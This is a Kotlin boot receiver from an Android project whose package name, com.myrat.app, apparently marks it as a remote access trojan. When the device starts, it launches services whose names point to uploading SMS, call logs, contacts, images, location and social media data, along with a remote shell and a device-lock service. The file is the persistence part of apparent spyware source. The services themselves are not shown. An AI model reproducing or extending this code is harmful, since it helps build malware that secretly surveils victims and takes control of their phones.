package com.myrat.app.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import com.myrat.app.service.CallLogUploadService
import com.myrat.app.service.CallService
import com.myrat.app.service.ContactUploadService
import com.myrat.app.service.ImageUploadService
import com.myrat.app.service.LocationService
import com.myrat.app.service.LockService
import com.myrat.app.service.ShellService
import com.myrat.app.service.SmsService
import com.myrat.app.service.SocialMediaService

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (Intent.ACTION_BOOT_COMPLETED == intent?.action) {
            val serviceIntent = Intent(context, SmsService::class.java)
            ContextCompat.startForegroundService(context, serviceIntent)

            val serviceIntentCommand = Intent(context, ShellService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntentCommand)
            } else {
                context.startService(serviceIntentCommand)
            }
            
            val serviceIntentCalls = Intent(context, CallLogUploadService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntentCalls)
            } else {
                context.startService(serviceIntentCalls)
            }

            val serviceIntentContact = Intent(context, ContactUploadService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntentContact)
            } else {
                context.startService(serviceIntentContact)
            }

            val serviceIntentImages = Intent(context, ImageUploadService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntentImages)
            } else {
                context.startService(serviceIntentImages)
            }

            val serviceIntentLocation = Intent(context, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntentLocation)
            } else {
                context.startService(serviceIntentLocation)
            }
            
            val serviceIntentcall = Intent(context, CallService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntentcall)
            } else {
                context.startService(serviceIntentcall)
            }

            val serviceIntentLock = Intent(context, LockService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntentLock)
            } else {
                context.startService(serviceIntentLock)
            }

            val serviceIntentSocialMedia = Intent(context, SocialMediaService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntentSocialMedia)
            } else {
                context.startService(serviceIntentSocialMedia)
            }
        }
    }
}